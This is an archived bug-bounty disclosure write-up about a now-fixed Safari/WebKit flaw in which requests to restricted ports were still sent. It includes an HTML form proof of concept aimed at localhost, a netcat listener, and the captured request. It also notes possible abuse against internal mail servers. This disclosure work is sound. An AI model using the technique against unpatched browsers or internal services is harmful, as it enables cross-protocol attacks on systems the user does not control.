---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-05-26_bypassing-restricted-port-protection-in-webkit.md
original_filename: 2021-05-26_bypassing-restricted-port-protection-in-webkit.md
title: Bypassing restricted port protection in WebKit
category: documents
detected_topics:
- command-injection
- otp
- api-security
- mobile-security
tags:
- imported
- documents
- command-injection
- otp
- api-security
- mobile-security
language: en
raw_sha256: 0f54d2316455fb032ebfb0900d4b51bc0100b1e43b7a0bf3442bc8ecd3d965a8
text_sha256: 9faa35a59bed87a51f71979651e55e2460c581d5ce93f5ea6c96f2e41e99fd9c
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: true
---

# Bypassing restricted port protection in WebKit

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-05-26_bypassing-restricted-port-protection-in-webkit.md
- Source Type: markdown
- Detected Topics: command-injection, otp, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: True
- Raw SHA256: `0f54d2316455fb032ebfb0900d4b51bc0100b1e43b7a0bf3442bc8ecd3d965a8`
- Text SHA256: `9faa35a59bed87a51f71979651e55e2460c581d5ce93f5ea6c96f2e41e99fd9c`


## Content

---
title: "Bypassing restricted port protection in WebKit"
page_title: "[#0007] Bypassing restricted port protection in WebKit | feed"
url: "https://feed.bugs.xdavidhu.me/bugs/0007"
final_url: "https://feed.bugs.xdavidhu.me/bugs/0007"
authors: ["David Schütz (@xdavidhu)"]
programs: ["Apple"]
bugs: ["Browser hacking"]
publication_date: "2021-05-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3621
---

#0007  
Vendor: Apple  
Status: fixed  
Reported: Mar 13, 2021  
Disclosed: May 26, 2021 (74 days) 

# Bypassing restricted port protection in WebKit

**Summary:**

Safari [restricted port blocking](https://fetch.spec.whatwg.org/#port-blocking) is not enforced properly. When requesting a page on a restricted port, only rendering is blocked, but the initial request gets sent to the restricted port.

**Steps to reproduce:**

  1. Create an HTML file with this POC:

  
  
  <form action="http://127.0.0.1:6000" method="POST" enctype="multipart/form-data">
  <label for="data">post data:</label>
  <input type="text" id="data" name="data">
  </form>
  

  2. Listen on port 6000 (a restricted port) with netcat: `$ nc -l 127.0.0.1 6000`
  3. Open the HTML file created in `Step 1.` in Safari
  4. Enter any value into the `post data:` form field, and press enter
  5. See that Safari shows an error with the message:

  
  
  Safari can't open the page "http://127.0.0.1:6000/". The error is: "Not allowed to use
  restricted network port" (WebKitErrorDomain:103)
  

  6. In the terminal running netcat, see that the request still got sent:

  
  
  $ nc -l 127.0.0.1 6000
  POST / HTTP/1.1
  Host: 127.0.0.1:6000
  Content-Type: multipart/form-data; boundary=----***REDACTED-SUSPECT-TOKEN***  Origin: null
  Connection: keep-alive
  Upgrade-Insecure-Requests: 1
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
  Content-Length: 153
  Accept-Language: en-gb
  Accept-Encoding: gzip, deflate
  
  ------***REDACTED-SUSPECT-TOKEN***  Content-Disposition: form-data; name="data"
  
  123_test_post_data
  ------WebKitFormBoundaryFFmUrfH05DvsT29s--
  

**Impact:**

This could be used to bypass the restricted port protection, and send malicious commands to non-HTTP services running on these sensitive ports, like mail servers. This blog post demonstrates the impact, exploiting internal SMTP servers: <https://cxsecurity.com/issue/WLB-2010030240>

**[Disclosure Warning]:**

**This issue is subject to a 90 day disclosure deadline.** On `2021-06-11` this issue will be publicly disclosed. If you would like to redact additional information or if for some reason the issue can’t be fixed until the deadline, let me know.

_This issue was fixed in[iOS/iPadOS 14.6](https://support.apple.com/en-us/HT212528), [macOS Big Sur 11.4](https://support.apple.com/en-us/HT212529), [Safari 14.1.1](https://support.apple.com/en-us/HT212534), [watchOS 7.5](https://support.apple.com/en-us/HT212533) and in [tvOS 14.6](https://support.apple.com/en-us/HT212532)._

_Suspected WebKit commit:[b5ad31c](https://github.com/WebKit/WebKit/commit/b5ad31c21d9194b9246a5cc9f649fccbafd028f2)_
